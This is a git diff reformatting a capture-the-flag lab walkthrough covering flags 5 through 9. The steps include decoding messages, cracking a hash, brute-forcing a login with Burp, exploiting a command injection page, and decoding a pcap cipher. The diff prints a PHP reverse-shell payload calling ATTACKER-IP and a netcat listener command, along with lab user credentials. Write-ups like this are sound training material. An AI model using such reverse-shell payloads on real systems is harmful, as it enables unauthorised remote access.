@@ -125,7 +125,12 @@ print(decoded_text)
 
 Result:
 ```
-Hello and congrats for solving this challenge, we hope that you enjoyed the challenges we presented so far. It is time for us to increase the difficulty level and make the upcoming challenges more challenging than previous ones. Before you move to the next challenge, here are the credentials for the 5th user: cinco:ruy70m35 head over to this user and get your 5th flag! goodluck for the upcoming challenges!
+Hello and congrats for solving this challenge, 
+we hope that you enjoyed the challenges we presented so far. 
+It is time for us to increase the difficulty level and make 
+the upcoming challenges more challenging than previous ones. 
+Before you move to the next challenge, here are the credentials for the 5th user: cinco:ruy70m35 
+head over to this user and get your 5th flag! goodluck for the upcoming challenges!
 ```
 
 ### Flag 6
@@ -142,10 +147,24 @@ Cracking the hash gives us the password: Hogwarts , so creds: seis:Hogwarts
 
 ### Flag 7
 The readme.txt file gives us the following path: "head over to /shellcmsdashboard webpage and find the credentials!"
-After trying a bit with hydra, having no success because no message on fail. I decided to bruteforce login on burp sniper attack and obtained the password qwerty and getting message "head over to /aabbzzee.php" which will give us a easy command injection box where we will get a reverse shell from.
+After trying a bit with hydra, having no success because no message on fail. 
+I decided to bruteforce login on burp sniper attack obtaining the password "qwerty".
 
-Adding "php -r '$sock=fsockopen("ATTACKER-IP",LISTEN-PORT);exec("/bin/sh -i <&3 >&3 2>&3");'" in the search bar
-and setting up a netcat reverse shell on LISTEN-PORT on the attacker box we will get www-data shell where we get the seventh user password: 6u1l3rm0p3n473
+Logged in and got the message: "head over to /aabbzzee.php" 
+
+This page will give us an easy command injection box where we will get a reverse shell from.
+
+My payload: 
+```bash
+php -r '$sock=fsockopen("ATTACKER-IP",LISTEN-PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
+```
+
+Netcat reverse shell on LISTEN-PORT on the attacker box:
+
+```bash
+nc -nvlp LISTEN-PORT
+```
+Getting www-data shell where we get the seventh user password: 6u1l3rm0p3n473
 
 
 ### Flag 8
@@ -166,11 +185,17 @@ Output:secarmyxoritup
 ### Flag 9
 We are presented with a pcapng file. Opening it up with wireshark we will get a tcp stream that has a LOT of text in which "QWERTY" is repeated a lot. Also, there were some dns queries to dcode.fr so there is a hint of that too.
 
-We obtain a password from the long text: mjwfr?2b6j3a5fx/c .Using dcode.fr and use keyboard shift cipher with settings: 
+We obtain a password from the long text: 
+```mjwfr?2b6j3a5fx/c .```
+
+
+Using dcode.fr and use keyboard shift cipher with settings: 
+
 	-QWERTY(US) 
+
 	-Shift Right + Clockwise rotation
 
-will give us the credentials for the 9th user: 	
+Result:
 ```
 nueve:355u4z4rc0
 ```
